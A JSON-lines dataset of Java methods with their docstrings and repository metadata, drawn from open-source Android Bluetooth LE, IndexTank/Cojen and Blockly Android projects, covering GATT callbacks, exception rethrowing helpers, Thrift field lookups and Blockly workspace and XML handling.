{"docstring": "/**\n * add(remove) new callback to an existing connection.\n * One Device, One {@link LiteBluetooth}.\n * But one device( {@link LiteBluetooth}) can add many callback {@link BluetoothGattCallback}\n *\n * {@link LiteBleGattCallback} is a extension of {@link BluetoothGattCallback}\n */\n", "func_signal": "private void addNewCallbackToOneConnection()", "code": "{\n    BluetoothGattCallback liteCallback = new BluetoothGattCallback() {\n        @Override\n        public void onConnectionStateChange(BluetoothGatt gatt, int status, int newState) {}\n\n        @Override\n        public void onCharacteristicChanged(BluetoothGatt gatt, BluetoothGattCharacteristic characteristic) {\n        }\n\n        @Override\n        public void onCharacteristicWrite(BluetoothGatt gatt,\n                                          BluetoothGattCharacteristic characteristic, int status) {\n        }\n\n        @Override\n        public void onReadRemoteRssi(BluetoothGatt gatt, int rssi, int status) {}\n    };\n\n    if (liteBluetooth.isConnectingOrConnected()) {\n        liteBluetooth.addGattCallback(liteCallback);\n        liteBluetooth.removeGattCallback(liteCallback);\n    }\n}", "path": "sample\\src\\com\\litesuits\\bluetooth\\sample\\SampleActivity.java", "repo_name": "litesuits/android-lite-bluetoothLE", "stars": 960, "license": "apache-2.0", "language": "java", "size": 287}
{"docstring": "/**\n * read RSSI of device\n */\n", "func_signal": "public void readRssiOfDevice()", "code": "{\n    liteBluetooth.newBleConnector()\n                 .readRemoteRssi(new BleRssiCallback() {\n                     @Override\n                     public void onSuccess(int rssi) {\n                         BleLog.i(TAG, \"Read Success, rssi: \" + rssi);\n                     }\n\n                     @Override\n                     public void onFailure(BleException exception) {\n                         BleLog.i(TAG, \"Read failure : \" + exception);\n                         bleExceptionHandler.handleException(exception);\n                     }\n                 });\n}", "path": "sample\\src\\com\\litesuits\\bluetooth\\sample\\SampleActivity.java", "repo_name": "litesuits/android-lite-bluetoothLE", "stars": 960, "license": "apache-2.0", "language": "java", "size": 287}
{"docstring": "/**\n * Called when the activity is first created.\n */\n", "func_signal": "@Override\npublic void onCreate(Bundle savedInstanceState)", "code": "{\n    super.onCreate(savedInstanceState);\n    setContentView(R.layout.main);\n    activity = this;\n    if (liteBluetooth == null) {\n        liteBluetooth = new LiteBluetooth(activity);\n    }\n    liteBluetooth.enableBluetoothIfDisabled(activity, 1);\n    bleExceptionHandler = new DefaultBleExceptionHandler(this);\n}", "path": "sample\\src\\com\\litesuits\\bluetooth\\sample\\SampleActivity.java", "repo_name": "litesuits/android-lite-bluetoothLE", "stars": 960, "license": "apache-2.0", "language": "java", "size": 287}
{"docstring": "/*------------  BluetoothGatt  ------------ */\n/**\n * Clears the device cache. After uploading new hello4 the DFU target will have other services than before.\n */\n", "func_signal": "public static boolean refreshDeviceCache(BluetoothGatt gatt)", "code": "{\n    /*\n     * There is a refresh() method in BluetoothGatt class but for now it's hidden. We will call it using reflections.\n\t\t */\n    try {\n        final Method refresh = BluetoothGatt.class.getMethod(\"refresh\");\n        if (refresh != null) {\n            final boolean success = (Boolean) refresh.invoke(gatt);\n            Log.i(TAG, \"Refreshing result: \" + success);\n            return success;\n        }\n    } catch (Exception e) {\n        Log.e(TAG, \"An exception occured while refreshing device\", e);\n    }\n    return false;\n}", "path": "library\\src\\com\\litesuits\\bluetooth\\utils\\BluetoothUtil.java", "repo_name": "litesuits/android-lite-bluetoothLE", "stars": 960, "license": "apache-2.0", "language": "java", "size": 287}
{"docstring": "/**\n * listen bluetooth gatt callback, and send a delayed message.\n */\n", "func_signal": "private void listenAndTimer(final BleCallback bleCallback, int what, BluetoothGattCallback callback)", "code": "{\n    bleCallback.setBluetoothGattCallback(callback);\n    liteBluetooth.addGattCallback(callback);\n    Message msg = handler.obtainMessage(what, bleCallback);\n    handler.sendMessageDelayed(msg, timeOutMillis);\n}", "path": "library\\src\\com\\litesuits\\bluetooth\\conn\\LiteBleConnector.java", "repo_name": "litesuits/android-lite-bluetoothLE", "stars": 960, "license": "apache-2.0", "language": "java", "size": 287}
{"docstring": "/**\n * enable notification of descriptor\n */\n", "func_signal": "private void enableNotificationOfDescriptor()", "code": "{\n    LiteBleConnector connector = liteBluetooth.newBleConnector();\n    connector.withUUIDString(UUID_SERVICE, UUID_CHAR_READ, UUID_DESCRIPTOR_READ)\n             .enableDescriptorNotification(new BleDescriptorCallback() {\n                 @Override\n                 public void onSuccess(BluetoothGattDescriptor descriptor) {\n                     BleLog.i(TAG,\n                             \"Notification descriptor Success, DATA: \" + Arrays.toString(descriptor.getValue()));\n                 }\n\n                 @Override\n                 public void onFailure(BleException exception) {\n                     BleLog.i(TAG, \"Notification descriptor failure : \" + exception);\n                     bleExceptionHandler.handleException(exception);\n                 }\n             });\n}", "path": "sample\\src\\com\\litesuits\\bluetooth\\sample\\SampleActivity.java", "repo_name": "litesuits/android-lite-bluetoothLE", "stars": 960, "license": "apache-2.0", "language": "java", "size": 287}
{"docstring": "/**\n * write data to descriptor\n */\n", "func_signal": "private void writeDataToDescriptor()", "code": "{\n    LiteBleConnector connector = liteBluetooth.newBleConnector();\n    connector.withUUIDString(UUID_SERVICE, UUID_CHAR_WRITE, UUID_DESCRIPTOR_WRITE)\n             .writeDescriptor(new byte[]{1, 2, 3}, new BleDescriptorCallback() {\n                 @Override\n                 public void onSuccess(BluetoothGattDescriptor descriptor) {\n                     BleLog.i(TAG, \"Write Success, DATA: \" + Arrays.toString(descriptor.getValue()));\n                 }\n\n                 @Override\n                 public void onFailure(BleException exception) {\n                     BleLog.i(TAG, \"Write failure: \" + exception);\n                     bleExceptionHandler.handleException(exception);\n                 }\n             });\n}", "path": "sample\\src\\com\\litesuits\\bluetooth\\sample\\SampleActivity.java", "repo_name": "litesuits/android-lite-bluetoothLE", "stars": 960, "license": "apache-2.0", "language": "java", "size": 287}
{"docstring": "/**\n * close connection\n */\n", "func_signal": "private void closeBluetoothGatt()", "code": "{\n    if (liteBluetooth.isConnectingOrConnected()) {\n        liteBluetooth.closeBluetoothGatt();\n    }\n}", "path": "sample\\src\\com\\litesuits\\bluetooth\\sample\\SampleActivity.java", "repo_name": "litesuits/android-lite-bluetoothLE", "stars": 960, "license": "apache-2.0", "language": "java", "size": 287}
{"docstring": "/**\n * enable characteristic notification\n */\n", "func_signal": "public boolean enableDescriptorNotification(BluetoothGattDescriptor descriptor, BleDescriptorCallback bleCallback)", "code": "{\n    handleDescriptorNotificationCallback(bleCallback);\n    return setDescriptorNotification(getBluetoothGatt(), descriptor, true);\n}", "path": "library\\src\\com\\litesuits\\bluetooth\\conn\\LiteBleConnector.java", "repo_name": "litesuits/android-lite-bluetoothLE", "stars": 960, "license": "apache-2.0", "language": "java", "size": 287}
{"docstring": "/**\n * read data from specify descriptor\n */\n", "func_signal": "public boolean readDescriptor(BluetoothGattDescriptor descriptor, BleDescriptorCallback bleCallback)", "code": "{\n    handleDescriptorReadCallback(bleCallback);\n    return handleAfterInitialed(getBluetoothGatt().readDescriptor(descriptor), bleCallback);\n}", "path": "library\\src\\com\\litesuits\\bluetooth\\conn\\LiteBleConnector.java", "repo_name": "litesuits/android-lite-bluetoothLE", "stars": 960, "license": "apache-2.0", "language": "java", "size": 287}
{"docstring": "/**\n * Throws the cause of the given exception, even though it may be\n * checked. If the cause is null, then the original exception is\n * thrown. This method only returns normally if the exception is null.\n *\n * @param t exception whose cause is to be thrown\n */\n", "func_signal": "public static void fireCause(Throwable t)", "code": "{\n    if (t != null) {\n        Throwable cause = t.getCause();\n        if (cause == null) {\n            cause = t;\n        }\n        fire(cause);\n    }\n}", "path": "cojen-2.2.1-sources\\org\\cojen\\util\\ThrowUnchecked.java", "repo_name": "LinkedInAttic/indextank-engine", "stars": 842, "license": "apache-2.0", "language": "java", "size": 3648}
{"docstring": "/** Returns true if field corresponding to fieldID is set (has been asigned a value) and false otherwise */\n", "func_signal": "public boolean isSet(_Fields field)", "code": "{\n  if (field == null) {\n    throw new IllegalArgumentException();\n  }\n\n  switch (field) {\n  case RECORDS:\n    return is_set_records();\n  }\n  throw new IllegalStateException();\n}", "path": "gen-java\\com\\flaptor\\indextank\\rpc\\LogBatch.java", "repo_name": "LinkedInAttic/indextank-engine", "stars": 842, "license": "apache-2.0", "language": "java", "size": 3648}
{"docstring": "/**\n * Throws the root cause of the given exception if it is unchecked or an\n * instance of any of the given declared types. Otherwise, it is thrown as\n * an UndeclaredThrowableException. If the root cause is null, then the\n * original exception is thrown. This method only returns normally if the\n * exception is null.\n *\n * @param t exception whose root cause is to be thrown\n * @param declaredTypes if exception is checked and is not an instance of\n * any of these types, then it is thrown as an\n * UndeclaredThrowableException.\n */\n", "func_signal": "public static void fireDeclaredRootCause(Throwable t, Class... declaredTypes)", "code": "{\n    Throwable root = t;\n    while (root != null) {\n        Throwable cause = root.getCause();\n        if (cause == null) {\n            break;\n        }\n        root = cause;\n    }\n    fireDeclared(root, declaredTypes);\n}", "path": "cojen-2.2.1-sources\\org\\cojen\\util\\ThrowUnchecked.java", "repo_name": "LinkedInAttic/indextank-engine", "stars": 842, "license": "apache-2.0", "language": "java", "size": 3648}
{"docstring": "/**\n * Performs a deep copy on <i>other</i>.\n */\n", "func_signal": "public LogBatch(LogBatch other)", "code": "{\n  if (other.is_set_records()) {\n    List<LogRecord> __this__records = new ArrayList<LogRecord>();\n    for (LogRecord other_element : other.records) {\n      __this__records.add(new LogRecord(other_element));\n    }\n    this.records = __this__records;\n  }\n}", "path": "gen-java\\com\\flaptor\\indextank\\rpc\\LogBatch.java", "repo_name": "LinkedInAttic/indextank-engine", "stars": 842, "license": "apache-2.0", "language": "java", "size": 3648}
{"docstring": "/** Returns true if field corresponding to fieldID is set (has been asigned a value) and false otherwise */\n", "func_signal": "public boolean isSet(_Fields field)", "code": "{\n  if (field == null) {\n    throw new IllegalArgumentException();\n  }\n\n  switch (field) {\n  case CATEGORY:\n    return is_set_category();\n  case VALUE:\n    return is_set_value();\n  }\n  throw new IllegalStateException();\n}", "path": "gen-java\\com\\flaptor\\indextank\\rpc\\CategoryFilter.java", "repo_name": "LinkedInAttic/indextank-engine", "stars": 842, "license": "apache-2.0", "language": "java", "size": 3648}
{"docstring": "/**\n * Find the _Fields constant that matches fieldId, or null if its not found.\n */\n", "func_signal": "public static _Fields findByThriftId(int fieldId)", "code": "{\n  switch(fieldId) {\n    case 1: // CATEGORY\n      return CATEGORY;\n    case 2: // VALUE\n      return VALUE;\n    default:\n      return null;\n  }\n}", "path": "gen-java\\com\\flaptor\\indextank\\rpc\\CategoryFilter.java", "repo_name": "LinkedInAttic/indextank-engine", "stars": 842, "license": "apache-2.0", "language": "java", "size": 3648}
{"docstring": "/**\n * Throws the either the original exception or the first found cause if it\n * matches one of the given declared types or is unchecked. Otherwise, the\n * original exception is thrown as an UndeclaredThrowableException. This\n * method only returns normally if the exception is null.\n *\n * @param t exception whose cause is to be thrown\n * @param declaredTypes if exception is checked and is not an instance of\n * any of these types, then it is thrown as an\n * UndeclaredThrowableException.\n */\n", "func_signal": "public static void fireFirstDeclared(Throwable t, Class... declaredTypes)", "code": "{\n    Throwable cause = t;\n    while (cause != null) {\n        cause = cause.getCause();\n        if (cause == null) {\n            break;\n        }\n        if (declaredTypes != null) {\n            for (Class declaredType : declaredTypes) {\n                if (declaredType.isInstance(cause)) {\n                    fire(cause);\n                }\n            }\n        }\n        if (cause instanceof RuntimeException) {\n            throw (RuntimeException) cause;\n        }\n        if (cause instanceof Error) {\n            throw (Error) cause;\n        }\n    }\n    throw new UndeclaredThrowableException(t);\n}", "path": "cojen-2.2.1-sources\\org\\cojen\\util\\ThrowUnchecked.java", "repo_name": "LinkedInAttic/indextank-engine", "stars": 842, "license": "apache-2.0", "language": "java", "size": 3648}
{"docstring": "/**\n * Throws the given exception if it is unchecked or an instance of any of\n * the given declared types. Otherwise, it is thrown as an\n * UndeclaredThrowableException. This method only returns normally if the\n * exception is null.\n *\n * @param t exception to throw\n * @param declaredTypes if exception is checked and is not an instance of\n * any of these types, then it is thrown as an\n * UndeclaredThrowableException.\n */\n", "func_signal": "public static void fireDeclared(Throwable t, Class... declaredTypes)", "code": "{\n    if (t != null) {\n        if (declaredTypes != null) {\n            for (Class declaredType : declaredTypes) {\n                if (declaredType.isInstance(t)) {\n                    fire(t);\n                }\n            }\n        }\n        if (t instanceof RuntimeException) {\n            throw (RuntimeException) t;\n        }\n        if (t instanceof Error) {\n            throw (Error) t;\n        }\n        throw new UndeclaredThrowableException(t);\n    }\n}", "path": "cojen-2.2.1-sources\\org\\cojen\\util\\ThrowUnchecked.java", "repo_name": "LinkedInAttic/indextank-engine", "stars": 842, "license": "apache-2.0", "language": "java", "size": 3648}
{"docstring": "/**\n * Throws the first found cause that matches one of the given declared\n * types or is unchecked. Otherwise, the immediate cause is thrown as an\n * UndeclaredThrowableException. If the immediate cause is null, then the\n * original exception is thrown. This method only returns normally if the\n * exception is null.\n *\n * @param t exception whose cause is to be thrown\n * @param declaredTypes if exception is checked and is not an instance of\n * any of these types, then it is thrown as an\n * UndeclaredThrowableException.\n */\n", "func_signal": "public static void fireFirstDeclaredCause(Throwable t, Class... declaredTypes)", "code": "{\n    Throwable cause = t;\n    while (cause != null) {\n        cause = cause.getCause();\n        if (cause == null) {\n            break;\n        }\n        if (declaredTypes != null) {\n            for (Class declaredType : declaredTypes) {\n                if (declaredType.isInstance(cause)) {\n                    fire(cause);\n                }\n            }\n        }\n        if (cause instanceof RuntimeException) {\n            throw (RuntimeException) cause;\n        }\n        if (cause instanceof Error) {\n            throw (Error) cause;\n        }\n    }\n    fireDeclaredCause(t, declaredTypes);\n}", "path": "cojen-2.2.1-sources\\org\\cojen\\util\\ThrowUnchecked.java", "repo_name": "LinkedInAttic/indextank-engine", "stars": 842, "license": "apache-2.0", "language": "java", "size": 3648}
{"docstring": "/**\n * Performs a deep copy on <i>other</i>.\n */\n", "func_signal": "public SearcherStats(SearcherStats other)", "code": "{\n  __isset_bit_vector.clear();\n  __isset_bit_vector.or(other.__isset_bit_vector);\n  if (other.is_set_status()) {\n    this.status = other.status;\n  }\n  this.mean_qps = other.mean_qps;\n  this.max_qps = other.max_qps;\n  if (other.is_set_top10()) {\n    List<String> __this__top10 = new ArrayList<String>();\n    for (String other_element : other.top10) {\n      __this__top10.add(other_element);\n    }\n    this.top10 = __this__top10;\n  }\n}", "path": "gen-java\\com\\flaptor\\indextank\\rpc\\SearcherStats.java", "repo_name": "LinkedInAttic/indextank-engine", "stars": 842, "license": "apache-2.0", "language": "java", "size": 3648}
{"docstring": "/**\n * Performs a deep copy on <i>other</i>.\n */\n", "func_signal": "public CategoryFilter(CategoryFilter other)", "code": "{\n  if (other.is_set_category()) {\n    this.category = other.category;\n  }\n  if (other.is_set_value()) {\n    this.value = other.value;\n  }\n}", "path": "gen-java\\com\\flaptor\\indextank\\rpc\\CategoryFilter.java", "repo_name": "LinkedInAttic/indextank-engine", "stars": 842, "license": "apache-2.0", "language": "java", "size": 3648}
{"docstring": "/**\n * Find the _Fields constant that matches fieldId, throwing an exception\n * if it is not found.\n */\n", "func_signal": "public static _Fields findByThriftIdOrThrow(int fieldId)", "code": "{\n  _Fields fields = findByThriftId(fieldId);\n  if (fields == null) throw new IllegalArgumentException(\"Field \" + fieldId + \" doesn't exist!\");\n  return fields;\n}", "path": "gen-java\\com\\flaptor\\indextank\\rpc\\SearcherStats.java", "repo_name": "LinkedInAttic/indextank-engine", "stars": 842, "license": "apache-2.0", "language": "java", "size": 3648}
{"docstring": "/**\n * Find the _Fields constant that matches fieldId, or null if its not found.\n */\n", "func_signal": "public static _Fields findByThriftId(int fieldId)", "code": "{\n  switch(fieldId) {\n    case 1: // STATUS\n      return STATUS;\n    case 2: // MEAN_QPS\n      return MEAN_QPS;\n    case 3: // MAX_QPS\n      return MAX_QPS;\n    case 4: // TOP10\n      return TOP10;\n    default:\n      return null;\n  }\n}", "path": "gen-java\\com\\flaptor\\indextank\\rpc\\SearcherStats.java", "repo_name": "LinkedInAttic/indextank-engine", "stars": 842, "license": "apache-2.0", "language": "java", "size": 3648}
{"docstring": "/** Returns true if field corresponding to fieldID is set (has been asigned a value) and false otherwise */\n", "func_signal": "public boolean isSet(_Fields field)", "code": "{\n  if (field == null) {\n    throw new IllegalArgumentException();\n  }\n\n  switch (field) {\n  case STATUS:\n    return is_set_status();\n  case MEAN_QPS:\n    return is_set_mean_qps();\n  case MAX_QPS:\n    return is_set_max_qps();\n  case TOP10:\n    return is_set_top10();\n  }\n  throw new IllegalStateException();\n}", "path": "gen-java\\com\\flaptor\\indextank\\rpc\\SearcherStats.java", "repo_name": "LinkedInAttic/indextank-engine", "stars": 842, "license": "apache-2.0", "language": "java", "size": 3648}
{"docstring": "/**\n * Find the _Fields constant that matches fieldId, throwing an exception\n * if it is not found.\n */\n", "func_signal": "public static _Fields findByThriftIdOrThrow(int fieldId)", "code": "{\n  _Fields fields = findByThriftId(fieldId);\n  if (fields == null) throw new IllegalArgumentException(\"Field \" + fieldId + \" doesn't exist!\");\n  return fields;\n}", "path": "gen-java\\com\\flaptor\\indextank\\rpc\\LogBatch.java", "repo_name": "LinkedInAttic/indextank-engine", "stars": 842, "license": "apache-2.0", "language": "java", "size": 3648}
{"docstring": "/**\n * Throws the root cause of the given exception, even though it may be\n * checked. If the root cause is null, then the original exception is\n * thrown. This method only returns normally if the exception is null.\n *\n * @param t exception whose root cause is to be thrown\n */\n", "func_signal": "public static void fireRootCause(Throwable t)", "code": "{\n    Throwable root = t;\n    while (root != null) {\n        Throwable cause = root.getCause();\n        if (cause == null) {\n            break;\n        }\n        root = cause;\n    }\n    fire(root);\n}", "path": "cojen-2.2.1-sources\\org\\cojen\\util\\ThrowUnchecked.java", "repo_name": "LinkedInAttic/indextank-engine", "stars": 842, "license": "apache-2.0", "language": "java", "size": 3648}
{"docstring": "/**\n * Find the _Fields constant that matches fieldId, or null if its not found.\n */\n", "func_signal": "public static _Fields findByThriftId(int fieldId)", "code": "{\n  switch(fieldId) {\n    case 1: // RECORDS\n      return RECORDS;\n    default:\n      return null;\n  }\n}", "path": "gen-java\\com\\flaptor\\indextank\\rpc\\LogBatch.java", "repo_name": "LinkedInAttic/indextank-engine", "stars": 842, "license": "apache-2.0", "language": "java", "size": 3648}
{"docstring": "/**\n * Throws the cause of the given exception if it is unchecked or an\n * instance of any of the given declared types. Otherwise, it is thrown as\n * an UndeclaredThrowableException. If the cause is null, then the original\n * exception is thrown. This method only returns normally if the exception\n * is null.\n *\n * @param t exception whose cause is to be thrown\n * @param declaredTypes if exception is checked and is not an instance of\n * any of these types, then it is thrown as an\n * UndeclaredThrowableException.\n */\n", "func_signal": "public static void fireDeclaredCause(Throwable t, Class... declaredTypes)", "code": "{\n    if (t != null) {\n        Throwable cause = t.getCause();\n        if (cause == null) {\n            cause = t;\n        }\n        fireDeclared(cause, declaredTypes);\n    }\n}", "path": "cojen-2.2.1-sources\\org\\cojen\\util\\ThrowUnchecked.java", "repo_name": "LinkedInAttic/indextank-engine", "stars": 842, "license": "apache-2.0", "language": "java", "size": 3648}
{"docstring": "/**\n * Find the _Fields constant that matches fieldId, throwing an exception\n * if it is not found.\n */\n", "func_signal": "public static _Fields findByThriftIdOrThrow(int fieldId)", "code": "{\n  _Fields fields = findByThriftId(fieldId);\n  if (fields == null) throw new IllegalArgumentException(\"Field \" + fieldId + \" doesn't exist!\");\n  return fields;\n}", "path": "gen-java\\com\\flaptor\\indextank\\rpc\\CategoryFilter.java", "repo_name": "LinkedInAttic/indextank-engine", "stars": 842, "license": "apache-2.0", "language": "java", "size": 3648}
{"docstring": "/**\n * Throws the given exception, even though it may be checked. This method\n * only returns normally if the exception is null.\n *\n * @param t exception to throw\n */\n", "func_signal": "public static void fire(Throwable t)", "code": "{\n    if (t != null) {\n        // Don't need to do anything special for unchecked exceptions.\n        if (t instanceof RuntimeException) {\n            throw (RuntimeException) t;\n        }\n        if (t instanceof Error) {\n            throw (Error) t;\n        }\n\n        ThrowUnchecked impl = cImpl;\n        if (impl == null) {\n            synchronized (ThrowUnchecked.class) {\n                impl = cImpl;\n                if (impl == null) {\n                    cImpl = impl =\n                        AccessController.doPrivileged(new PrivilegedAction<ThrowUnchecked>() {\n                            public ThrowUnchecked run() {\n                                return generateImpl();\n                            }\n                        });\n                }\n            }\n        }\n\n        impl.doFire(t);\n    }\n}", "path": "cojen-2.2.1-sources\\org\\cojen\\util\\ThrowUnchecked.java", "repo_name": "LinkedInAttic/indextank-engine", "stars": 842, "license": "apache-2.0", "language": "java", "size": 3648}
{"docstring": "/**\n * Adds a new block to the workspace as a root block.\n *\n * @param block The block to add to the root of the workspace.\n * @param isNewBlock Set when the block is new to the workspace (compared to moving it from some\n *                   previous connection).\n *     @throws IllegalArgumentException If the block or its children are references to undefined\n *                                  procedures.\n */\n", "func_signal": "public void addRootBlock(Block block, boolean isNewBlock)", "code": "{\n    if (block == null) {\n        throw new IllegalArgumentException(\"Cannot add a null block as a root block\");\n    }\n    if (block.getPreviousBlock() != null) {\n        throw new IllegalArgumentException(\"Root blocks may not have a previous block\");\n    }\n    if (mRootBlocks.contains(block)) {\n        throw new IllegalArgumentException(\"Block is already a root block.\");\n    }\n    mRootBlocks.add(block);\n    if (isNewBlock) {\n        block.setEventWorkspaceId(getId());\n        try {\n            mStats.collectStats(block, true);\n        } catch (BlockLoadingException e) {\n            throw new IllegalArgumentException(e);\n        }\n    }\n}", "path": "blocklylib-core\\src\\main\\java\\com\\google\\blockly\\model\\Workspace.java", "repo_name": "google/blockly-android", "stars": 665, "license": "apache-2.0", "language": "java", "size": 7530}
{"docstring": "/**\n * Remove a block from the workspace.\n *\n * @param block The block block to remove, possibly with descendants attached.\n * @param cleanupStats True if this block is being deleted and its connections and references\n *                     should be removed.\n * @return True if the block was removed, false otherwise.\n */\n", "func_signal": "public boolean removeRootBlock(Block block, boolean cleanupStats)", "code": "{\n    boolean foundAndRemoved = mRootBlocks.remove(block);\n    if (foundAndRemoved) {\n        block.setEventWorkspaceId(null);\n        if (cleanupStats) {\n            mStats.cleanupStats(block);\n        }\n    }\n    return foundAndRemoved;\n}", "path": "blocklylib-core\\src\\main\\java\\com\\google\\blockly\\model\\Workspace.java", "repo_name": "google/blockly-android", "stars": 665, "license": "apache-2.0", "language": "java", "size": 7530}
{"docstring": "/**\n * Handles the selection of a section, including closing the navigation drawer.\n * @param sectionIndex\n */\n", "func_signal": "public void onSectionItemClicked(int sectionIndex)", "code": "{\n    mSectionsListView.setItemChecked(sectionIndex, true);\n    setNavDrawerOpened(false);\n    if (mCurrentSection == sectionIndex) {\n        return;\n    }\n\n    changeSection(sectionIndex);\n    mCurrentSection = sectionIndex;\n}", "path": "blocklylib-core\\src\\main\\java\\com\\google\\blockly\\android\\BlocklySectionsActivity.java", "repo_name": "google/blockly-android", "stars": 665, "license": "apache-2.0", "language": "java", "size": 7530}
{"docstring": "/**\n * Reset the workspace view when changing workspaces.  Removes old views and creates all\n * necessary new views.\n */\n", "func_signal": "public void resetWorkspace()", "code": "{\n    mBlockFactory.clearWorkspaceBlockReferences(getId());\n    mRootBlocks.clear();\n    mStats.clear();\n    mTrashCategory.clear();\n}", "path": "blocklylib-core\\src\\main\\java\\com\\google\\blockly\\model\\Workspace.java", "repo_name": "google/blockly-android", "stars": 665, "license": "apache-2.0", "language": "java", "size": 7530}
{"docstring": "/**\n * Create a workspace.\n *\n * @param context The context this workspace is associated with.\n * @param controller The controller for this Workspace.\n * @param factory The factory used to build blocks in this workspace.\n */\n", "func_signal": "public Workspace(Context context, BlocklyController controller, BlockFactory factory)", "code": "{\n    if (controller == null) {\n        throw new IllegalArgumentException(\"BlocklyController may not be null.\");\n    }\n\n    mContext = context;\n    mController = controller;\n    mBlockFactory = factory;\n    mId = UUID.randomUUID().toString();\n\n    mProcedureManager = new ProcedureManager(controller, this);\n    mStats = new WorkspaceStats(mVariableNameManager, mProcedureManager, mConnectionManager);\n}", "path": "blocklylib-core\\src\\main\\java\\com\\google\\blockly\\model\\Workspace.java", "repo_name": "google/blockly-android", "stars": 665, "license": "apache-2.0", "language": "java", "size": 7530}
{"docstring": "/**\n * Convenience function to serialize one stack of Blocks (a BlockGroup, effectively).\n *\n * @param rootBlock The root block of the stack to serialize.\n * @param options The options to configure the block serialization. If omitted,\n *                {@link IOOptions#WRITE_ALL_DATA} will be used by default.\n * @return XML string for block and all descendant blocks.\n * @throws BlocklySerializerException\n */\n", "func_signal": "public static String writeBlockToXml(@NonNull Block rootBlock, @Nullable IOOptions options)\n        throws BlocklySerializerException", "code": "{\n    StringWriter sw = new StringWriter();\n    List<Block> temp = new ArrayList<>();\n    temp.add(rootBlock);\n    writeToXml(temp, sw, options);\n    String xmlString = sw.toString();\n    try {\n        sw.close();\n        return xmlString;\n    } catch (IOException e) {\n        throw new IllegalStateException(e);\n    }\n}", "path": "blocklylib-core\\src\\main\\java\\com\\google\\blockly\\utils\\BlocklyXmlHelper.java", "repo_name": "google/blockly-android", "stars": 665, "license": "apache-2.0", "language": "java", "size": 7530}
{"docstring": "/**\n * Loads toolbox from XML.  Each category may have multiple subcategories and/or multiple blocks\n * contained in it or descending from it.\n *\n * @param is The input stream from which to read.\n * @param blockFactory The BlockFactory for the workspace where the Blocks are being loaded.\n * @param workspaceId The workspaceId to set on all blocks attached to this Category.\n *\n * @return The top-level category in the toolbox.\n * @throws BlockLoadingException If any error occurs with the input. It may wrap an IOException\n *                               or XmlPullParserException as a root cause.\n */\n", "func_signal": "public static BlocklyCategory loadToolboxFromXml(InputStream is, BlockFactory blockFactory,\n                                                 String workspaceId)\n        throws BlockLoadingException", "code": "{\n    try {\n        XmlPullParser parser = PARSER_FACTORY.newPullParser();\n        parser.setInput(is, null);\n        return BlocklyCategory.fromXml(parser, blockFactory, workspaceId);\n    } catch (XmlPullParserException e) {\n        throw new BlockLoadingException(e);\n    }\n}", "path": "blocklylib-core\\src\\main\\java\\com\\google\\blockly\\utils\\BlocklyXmlHelper.java", "repo_name": "google/blockly-android", "stars": 665, "license": "apache-2.0", "language": "java", "size": 7530}
{"docstring": "/**\n * Loads the toolbox category, blocks, and buttons from the {@code /raw/} resources directory.\n *\n * @param toolboxResId The resource id of the set of blocks or block groups to show in the\n * @throws BlockLoadingException If toolbox was not loaded. May wrap an IOException or another\n *                               BlockLoadingException.\n */\n", "func_signal": "public void loadToolboxContents(@RawRes int toolboxResId) throws BlockLoadingException", "code": "{\n    InputStream is = mContext.getResources().openRawResource(toolboxResId);\n    loadToolboxContents(is);\n}", "path": "blocklylib-core\\src\\main\\java\\com\\google\\blockly\\model\\Workspace.java", "repo_name": "google/blockly-android", "stars": 665, "license": "apache-2.0", "language": "java", "size": 7530}
{"docstring": "/**\n * @return The title of the current workspace / section.\n */\n", "func_signal": "@NonNull\nprotected CharSequence getWorkspaceTitle()", "code": "{\n    int section = getCurrentSectionIndex();\n    if (section < getSectionCount()) {\n        return (String) mListAdapter.getItem(section);\n    } else {\n        // Use the Activity name.\n        return getTitle();\n    }\n}", "path": "blocklylib-core\\src\\main\\java\\com\\google\\blockly\\android\\BlocklySectionsActivity.java", "repo_name": "google/blockly-android", "stars": 665, "license": "apache-2.0", "language": "java", "size": 7530}
{"docstring": "/**\n * Serializes the current element and all child nodes as a String.\n * @param parser The parser to pull from.\n * @return The composed element string.\n * @throws XmlPullParserException\n * @throws IOException\n */\n", "func_signal": "public static String captureElement(XmlPullParser parser)\n        throws XmlPullParserException, IOException", "code": "{\n    int event = parser.getEventType();\n    if (event != XmlPullParser.START_TAG) {\n        throw new XmlPullParserException(\"Expected call to begin at START_TAG\");\n    }\n    int depth = 0;\n\n    StringWriter sw = new StringWriter();\n    XmlSerializer serializer = PARSER_FACTORY.newSerializer();\n    serializer.setOutput(sw);\n\n    String namespace, prefix;\n    while (event != XmlPullParser.END_DOCUMENT) {\n        switch (event) {\n            case XmlPullParser.START_TAG:\n                ++depth;\n                namespace = parser.getNamespace();\n                prefix = parser.getPrefix();\n                if (namespace != null && prefix != null) {\n                    serializer.setPrefix(prefix, namespace);\n                }\n                serializer.startTag(namespace, parser.getName());\n                int attrCount = parser.getAttributeCount();\n                for (int i = 0; i < attrCount; ++i) {\n                    namespace = parser.getAttributeNamespace(i);\n                    prefix = parser.getAttributePrefix(i);\n                    if (namespace != null && prefix != null) {\n                        serializer.setPrefix(prefix, namespace);\n                    }\n                    serializer.attribute(namespace, parser.getAttributeName(i),\n                            parser.getAttributeValue(i));\n                }\n                break;\n\n            case XmlPullParser.TEXT:\n            case XmlPullParser.IGNORABLE_WHITESPACE:\n                serializer.text(parser.getText());\n                break;\n\n            case XmlPullParser.CDSECT:\n                serializer.cdsect(parser.getText());\n                break;\n\n            case XmlPullParser.END_TAG:\n                namespace = parser.getNamespace();\n                if (namespace != null) {\n                    serializer.setPrefix(parser.getPrefix(), namespace);\n                }\n                serializer.endTag(namespace, parser.getName());\n                --depth;\n                break;\n        }\n        if (depth <= 0) {\n            serializer.flush();\n            return sw.toString();\n        }\n\n        event = parser.next();\n    }\n    throw new IOException(\"Unexpected end of document.\");\n}", "path": "blocklylib-core\\src\\main\\java\\com\\google\\blockly\\utils\\BlocklyXmlHelper.java", "repo_name": "google/blockly-android", "stars": 665, "license": "apache-2.0", "language": "java", "size": 7530}
